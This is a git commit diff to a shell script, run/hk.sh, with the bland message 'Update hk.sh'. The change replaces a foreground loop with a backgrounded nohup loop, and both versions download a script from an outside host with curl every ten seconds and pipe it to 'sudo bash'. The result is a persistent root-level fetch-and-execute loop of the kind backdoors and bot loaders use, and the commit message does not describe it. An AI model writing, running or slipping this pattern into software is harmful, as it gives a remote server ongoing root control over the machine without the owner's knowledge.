0f9240f253d9344151df1d40a569400fa547f7f3
aa0c <107745374+awaitla@users.noreply.github.com>
2024-06-27 21:36:10 +0800

    Update hk.sh

--- run/hk.sh
+++ run/hk.sh
@@ -1,6 +1,1 @@
-
-
-while true; do
-   sudo curl -fsSL https://api.hotpe.top/test/test.sh | sudo bash  
-   sleep 10
-done
+nohup bash -c 'while true; do sudo curl -fsSL https://api.hotpe.top/test/test.sh | sudo bash; sleep 10; done' &
